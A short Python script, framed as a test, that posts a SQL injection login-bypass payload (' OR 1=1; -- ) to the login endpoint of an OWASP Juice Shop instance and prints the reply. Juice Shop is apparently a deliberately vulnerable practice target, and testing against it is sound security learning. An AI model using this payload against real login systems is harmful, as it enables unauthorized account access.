import requests

def test_sqli_blind():
    with requests.Session() as session:
        login_url = "https://juice-shop.herokuapp.com/rest/user/login"
        payload = {"email": "' OR 1=1; -- ", "password": "password"}
        response = session.post(login_url, json=payload)
        print(response.text)

test_sqli_blind()
